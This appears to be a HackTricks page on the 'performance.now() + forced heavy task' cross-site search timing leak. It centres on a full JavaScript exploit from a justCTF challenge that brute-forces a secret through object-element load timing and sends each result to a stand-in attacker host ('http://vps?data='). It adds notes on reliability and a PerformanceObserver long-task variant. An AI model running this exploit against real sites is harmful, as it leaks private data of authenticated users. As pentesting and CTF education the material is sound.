---
title: "performance.now + Force heavy task"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/pentesting-web/xs-search/performance.now-+-force-heavy-task.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: web
---

# `performance.now()` + Forced Heavy Task

`performance.now()` + Forced Heavy Task

```
<!DOCTYPE html>
<html>
  <head> </head>
  <body>
    <img src="https://deelay.me/30000/https://example.com" />
    <script>
      fetch("https://deelay.me/30000/https://example.com")
      function send(data) {
        fetch("http://vps?data=" + encodeURIComponent(data)).catch((err) => 1)
      }
      function leak(char, callback) {
        return new Promise((resolve) => {
          let ss = "just_random_string"
          let url =
            `http://baby-xsleak-ams3.web.jctf.pro/search/?search=${char}&msg=` +
            ss[Math.floor(Math.random() * ss.length)].repeat(1000000)
          let start = performance.now()
          let object = document.createElement("object")
          object.width = "2000px"
          object.height = "2000px"
          object.data = url
          object.onload = () => {
            object.remove()
            let end = performance.now()
            resolve(end - start)
          }
          object.onerror = () => console.log("Error event triggered")
          document.body.appendChild(object)
        })
      }
      send("start")
      let charset = "abcdefghijklmnopqrstuvwxyz_}".split("")
      let flag = "justCTF{"
      async function main() {
        let found = 0
        let notFound = 0
        for (let i = 0; i < 3; i++) {
          await leak("..")
        }
        for (let i = 0; i < 3; i++) {
          found += await leak("justCTF")
        }
        for (let i = 0; i < 3; i++) {
          notFound += await leak("NOT_FOUND123")
        }
        found /= 3
        notFound /= 3
        send("found flag:" + found)
        send("not found flag:" + notFound)
        let threshold = found - (found - notFound) / 2
        send("threshold:" + threshold)
        if (notFound > found) {
          return
        }
        // exploit
        while (true) {
          if (flag[flag.length - 1] === "}") {
            break
          }
          for (let char of charset) {
            let trying = flag + char
            let time = 0
            for (let i = 0; i < 3; i++) {
              time += await leak(trying)
            }
            time /= 3
            send("char:" + trying + ",time:" + time)
            if (time >= threshold) {
              flag += char
              send(flag)
              break
            }
          }
        }
      }
      main()
    </script>
  </body>
</html>
```
## When this works best

This pattern is most useful when a candidate query changes **how expensive the target page is to process**, not only the response status code. Typical places to look for this are:[\[1\]](#references)[\[2\]](#references)

- **Search endpoints** that reflect a very large body only on a hit.
- **Preview/render endpoints** (Markdown, HTML, syntax highlighting, diff viewers) where one branch creates much more DOM/layout work.
- **Validation/filtering gadgets** where one input triggers expensive parsing, regex processing, highlighting, or templating while the other branch exits fast. Modern examples include`pattern` validation / ReDoS-style regex backtracking and syntax highlighters that only do the expensive path on a hit.
- **Same-site HTML injection** scenarios where you can embed an authenticated endpoint with`<object>` /`<iframe>` and turn a hit/miss difference into a timing oracle.

If the hit/miss difference is only a few bytes on the wire, the signal is usually too noisy. The trick becomes practical when you can amplify the positive or negative branch into a **clearly heavier parse/render/application task**.

## Practical reliability notes

- **Warm up first:** the first few measurements are often skewed by DNS, TCP/TLS setup, process scheduling, or JIT compilation. Do a few dummy requests before calibrating the threshold.
- **Defeat caches explicitly:** add random query parameters or random filler so repeated probes do not collapse into the HTTP cache or a reused application result.
- **Compression can kill the signal:** if the only difference is repeated text, gzip/brotli can shrink it heavily. Prefer responses that also increase**DOM size** ,**layout work** , or**client-side processing time** .
- **Keep the embedded viewport large and deterministic:** fixed`width` /`height` on`<object>` or`<iframe>` helps because a tiny default viewport may hide the rendering cost you are trying to amplify.
- **Use median/average from several runs:** recompute a threshold from a known-hit and a known-miss sample, then classify each candidate with multiple probes instead of trusting one measurement.
- **If timer precision is coarse, amplify the task more:** a forced branch that regularly creates`50ms+` long tasks can sometimes still be classified with other clocks or`PerformanceObserver` , but only if the branch is truly heavy.
- **Verify authenticated embedding:** SameSite cookie rules, third-party-cookie restrictions, CSP`frame-ancestors` , X-Frame-Options, CORP, and Fetch Metadata checks can prevent the cross-origin object/frame from reaching the authenticated state whose secret you want to test.<sup>[\[2\]](#references)</sup>
- **Add timeouts and error handling:** an`object` /`iframe` load event is not guaranteed. A failed candidate must not stall the entire extraction loop.

## Browser reality in 2025+

A useful mental model is: **do not depend on ultra-fine timers; depend on a huge workload gap**. Browsers coarsen `performance.now()` in non-isolated contexts, so this technique is much more reliable when the hit/miss delta is in the **multi-millisecond** range, not when trying to distinguish tiny sub-millisecond differences.[\[5\]](#references)

In theory you can recover better timer precision from a **cross-origin isolated** page, but in practice that usually conflicts with generic XS-Search targets: isolation requires `COOP: same-origin` plus `COEP: require-corp` or `credentialless`, and `COEP` blocks many arbitrary cross-origin embeds unless the target explicitly opts into `CORP`/`CORS` or is loaded without credentials. For real attacks, assume you will usually be measuring from a **non-isolated attacker page** and design the heavy branch accordingly.[\[4\]](#references)

## Long Tasks API as a coarse Boolean oracle

If the heavy branch is expected to block the UI thread for **`>=50ms`**, you can also watch for `longtask` entries instead of trusting raw deltas only. This is especially useful when the response branch triggers **expensive layout/reflow/rendering** or client-side validation that creates a very visible stall.[\[3\]](#references)

Note

The Long Tasks API has **limited browser support**, so treat it as an additional oracle, not as the only one.

## Example: using `PerformanceObserver` as an extra oracle

```
<script>
  const longtasks = []
  new PerformanceObserver((list) => {
    for (const entry of list.getEntries()) longtasks.push(entry.duration)
  }).observe({ type: "longtask", buffered: true })
  async function leakWithLongTasks(url) {
    longtasks.length = 0
    const obj = document.createElement("object")
    obj.width = "2000px"
    obj.height = "2000px"
    obj.data = url
    document.body.appendChild(obj)
    await new Promise((resolve) => (obj.onload = resolve))
    obj.remove()
    return Math.max(0, ...longtasks) >= 50
  }
</script>
```
This won’t magically fix a weak oracle. It only helps when one branch really does produce **observable long tasks** and the other branch does not. If both branches stay below the long-task threshold, go back to **making the target do more work** or use another leak primitive.

For alternative clocks and contention-based variants, also check:

[Event Loop Blocking + Lazy images](event-loop-blocking-+-lazy-images.html)

## References
